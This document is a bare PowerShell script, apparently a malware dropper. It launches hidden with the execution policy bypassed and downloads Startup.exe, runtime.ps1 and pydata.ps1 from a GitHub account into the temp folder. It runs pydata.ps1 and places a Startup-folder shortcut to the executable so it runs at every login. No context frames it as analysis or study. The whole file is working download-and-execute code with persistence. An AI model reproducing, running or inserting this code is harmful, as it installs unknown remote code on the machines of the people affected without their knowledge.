cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
# Define storage paths
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$tempPath = "$env:TEMP"

# Create directories if they don't exist
If (!(Test-Path -Path $startupPath)) {
    New-Item -ItemType Directory -Path $startupPath -Force
    Write-Host "Startup folder created: $startupPath" -ForegroundColor Cyan
}

If (!(Test-Path -Path $tempPath)) {
    New-Item -ItemType Directory -Path $tempPath -Force
    Write-Host "Temp folder created: $tempPath" -ForegroundColor Cyan
}

# Download Startup.exe to Temp
try {
    $startupFile = "$tempPath\Startup.exe"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/Startup.exe" `
        -OutFile $startupFile
    Write-Host "Startup.exe downloaded successfully: $startupFile" -ForegroundColor Green
} catch {
    Write-Host "Error downloading Startup.exe: $_" -ForegroundColor Red
}

# Create Shortcut in Startup Folder
try {
    $WScriptShell = New-Object -ComObject WScript.Shell
    $shortcut = $WScriptShell.CreateShortcut("$startupPath\Startup.lnk")
    $shortcut.TargetPath = $startupFile
    $shortcut.WorkingDirectory = $tempPath
    $shortcut.WindowStyle = 1
    $shortcut.Description = "Startup Application"
    $shortcut.Save()
    Write-Host "Shortcut for Startup.exe created in: $startupPath" -ForegroundColor Green
} catch {
    Write-Host "Error creating shortcut: $_" -ForegroundColor Red
}

# Download runtime.ps1
try {
    $runtimeFile = "$tempPath\runtime.ps1"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/runtime.ps1" `
        -OutFile $runtimeFile
    Write-Host "runtime.ps1 downloaded successfully: $runtimeFile" -ForegroundColor Green
} catch {
    Write-Host "Error downloading runtime.ps1: $_" -ForegroundColor Red
}

# Download pydata.ps1
try {
    $pydataFile = "$tempPath\pydata.ps1"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/pydata.ps1" `
        -OutFile $pydataFile
    Write-Host "pydata.ps1 downloaded successfully: $pydataFile" -ForegroundColor Green
} catch {
    Write-Host "Error downloading pydata.ps1: $_" -ForegroundColor Red
}

# Execute pydata.ps1
try {
    Write-Host "Executing pydata.ps1..." -ForegroundColor Cyan
    & $pydataFile
    Write-Host "pydata.ps1 executed successfully." -ForegroundColor Green
} catch {
    Write-Host "Error executing pydata.ps1: $_" -ForegroundColor Red
}

# Display final paths
Write-Host "`nDownloaded file paths:" -ForegroundColor Yellow
Write-Host "Startup.exe: $startupFile"
Write-Host "Startup Shortcut: $startupPath\Startup.lnk"
Write-Host "runtime.ps1: $runtimeFile"
Write-Host "pydata.ps1: $pydataFile"
